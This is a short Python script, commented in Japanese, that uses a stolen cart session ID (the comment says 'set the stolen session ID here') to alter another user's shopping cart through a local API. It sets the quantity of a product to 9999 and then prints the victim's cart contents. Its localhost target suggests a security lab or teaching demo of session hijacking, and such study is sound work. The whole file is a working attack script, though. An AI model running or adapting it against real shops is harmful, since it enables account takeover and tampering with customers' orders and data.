import requests
import json

url = 'http://localhost:3000/api/cart'

# ここに窃取したセッションIDをセット
cart_session_id = 'e0aaffe5-33b5-45fa-9530-4afa183e5ede'

cookies = {'cart_session_id': cart_session_id}
headers = {'Content-Type': 'application/json'}
payload = {'productId': 'A-002', 'quantity': 9999}

res = requests.patch(
  url=url,
  data=json.dumps(payload),
  headers=headers,
  cookies=cookies
)

print(f'ステータスコード: {res.status_code}')

is_success = res.json().get('success')
print(f'res.success: {is_success}')

if is_success:
  res = requests.get(
    url=url,
    cookies=cookies
  )
  cart_items = res.json().get('payload')
  print(f'カートの内容: {json.dumps(cart_items, indent=2)}')